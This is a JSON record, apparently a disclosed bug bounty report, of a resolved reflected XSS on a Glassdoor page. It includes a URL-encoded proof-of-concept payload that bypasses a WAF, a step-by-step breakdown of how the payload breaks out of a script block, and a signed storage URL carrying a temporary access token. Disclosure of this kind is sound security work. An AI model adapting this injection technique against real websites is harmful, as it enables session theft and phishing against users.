@@ -1,0 +1,142 @@
+{
+  "id": 846338,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NDYzMzg=",
+  "url": "https://hackerone.com/reports/846338",
+  "title": "Reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-10T10:16:52.521Z",
+  "submitted_at": "2020-04-10T10:16:52.521Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "parzel",
+    "url": "/parzel",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/kAVxjQwjsERoJp9eMTQEwZD1/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 204,
+    "url": "https://hackerone.com/glassdoor",
+    "handle": "glassdoor",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/u258rsub76htn189l6jc17ycwrc4/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/u258rsub76htn189l6jc17ycwrc4/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Glassdoor",
+      "twitter_handle": "glassdoor",
+      "website": "https://www.glassdoor.com/",
+      "about": "Your work people are here"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-05-22T15:17:02.452Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-04-22T15:16:56.541Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nThere is a reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/ through the utm_source parameter. By using URL encoding I was able to bypass the WAF.\n\nAffected URL or select Asset from In-Scope:\nhttps://www.glassdoor.com/\n\nAffected Parameter:\nutm_source\n\nVulnerability Type:\nXSS\n\nBrowsers tested:\nFirefox 75.0\n\n## Steps To Reproduce:\n  1. Visit the following POC link:\n```\nhttps://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e\n```\n\n## Explanation\nThe utm_source parameter is not escaped properly for URL encoded values. We can escape at multiple locations in the source. I escaped in the script section. The payload finished open function calls from jQuery, executes an alert as POC and then finished the original script tag. Basically we can dissect it as follows:\n```\nabc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e\n\nis url encoded for\n\nabc`;return+false});});alert`xss`;</script>\n\nwhich is used like\n\nabc`;                       Finish the string\nreturn+false});      Finish the jQuery click function\n});                            Finish the jQuery ready function\nalert`xss`;              Here we can execute our code\n</script>               This closes the script tag to prevent JavaScript parsing errors\n```\n\n## Supporting Material/References (screenshots, logs, videos):\n{F782251}\n\n## Impact\n\nA XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 782251,
+      "file_name": "Screenshot_from_2020-04-10_12-08-05.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TDDVhmtSYyfUwa1goRYzV4xu?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-04-10_12-08-05.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-04-10_12-08-05.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTEH7FK2R%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T103254Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICN4dtf0Tdbkaq5cn4i%2FXti7QcDA1cKVfkHNEt1w6htIAiBUkPisuo8fhfz0yAKSS95Q33zYfabab6LGhpfF0fhKqCqxBQgSEAMaDDAxMzYxOTI3NDg0OSIMdLbiI216xY5zVx3cKo4FROJoon80w%2BDZm5e0WvVs4pCgw154wQGpSo%2F9%2BLabMvqd5hWVda%2FYfEk%2FSmEDTF50kF2lvogkzcPOpTOAJywKgSPNgH22KBdHpFzglEdeM6ucEAVz5PG4%2B%2BnsnssWFAZnSK2HdAsF80vAIrVZddmwmGtBJ8Vy6GgsuvrqfmSUiJ7YWc9DObJrduBPKZlUhlRIdHcmJbDfNZw%2F5x5Dj3nk7GiMRhU3Rdj2E06xzz57WekiqPqHX8SgFAbP1llh2pEdazmNHja6e%2F8CaQ9ZvjjXwxPGue4PBiuhk7gD0nvzaip%2BVU%2Bg0%2F4cCd%2BRuUuh%2BthIRX8odPXsuR1%2Bdo6WG3vFaWIfuovwOTvateT1FOPKL3IlqBVNGusQmZxoxqyRZNA%2BGDGkvIWrl14Ea%2Bol7kykC9yRDZV7wsN9Sy2O6ub0X1iUtP2nwai0R6gD4lXoDwpcPjMQBPInE2CG%2BKNqfW8RLSH7Qt6Op9IcRtUNsTJfA2UiI8Llap%2B4qfvD90bPmZpfDjp4f9PBFMp%2FJZEPno2an6PE4TQvhXbe4qGT8I4hQ4RUv%2BW98vHHV4Ct%2BmBTKimhupQaWg7KDndaBqKWP1R7mbj7YGOmT5AL%2FV0giwMlCDzQceTZKyyn3Rc7tiD7Vb5oyNLlGs56f6nPAyASTS7FZ%2F59ZcGZURXVLUwLmwqZ3pr1EUtg%2FgxPpvjFwlg7PYJFhgjs7x7mS1hynRgNtc8VZVAEcUu7UTm5iTOjjLHfKPU3ge6LWYFn5rtyjyMtxz5pw%2FmNaI1GJwp%2F5ChOyeb%2Fx2We77B3pozJdgP%2BC30cXd2nDaQkRhCy0oiHKvgz3QC%2FPW5CW8O71kpnNHvexQj6GztvB98%2BKapW3N6y%2FkAcMI%2FzvsYGOrIBEmTge1rlGKJIsBdOtKsimeEb%2BvaRhFqFZP7R0c%2FD5V5fSThFO94JuZaMNmDHxmBnUyC3Kg3XDXE%2BxaY9Nq11Vvdhlkwbx%2FWZWTi8mJ0O1rU4zjdbbMpDGwBL15YlAX08vKzpPR14k8stMuLxICysDUkd0RFrkNzEhvy6UV19TFKRlTCUFPbp%2BLNaIoC%2BbuvSgiII%2FhDB369MhAZhYd7PcjtGGOMMC2BrMZgbuZebVGPkvA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=02699f6982e1762b85df0993d5390b3297c1893b6a39eda27f9f018f463e77f9",
+      "file_size": 31702,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-05-22T15:16:56.681Z",
+  "allow_singular_disclosure_after": -168290157.39745525,
+  "singular_disclosure_allowed": true,
+  "vote_count": 673,
+  "voters": [
+    "proviesec",
+    "lachlan2k",
+    "arist0phanes",
+    "capso",
+    "rootz491",
+    "8910jq",
+    "orange303",
+    "loaymorad",
+    "deidar3",
+    "superpan",
+    "and 663 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 8181,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "https://www.glassdoor.com/*",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
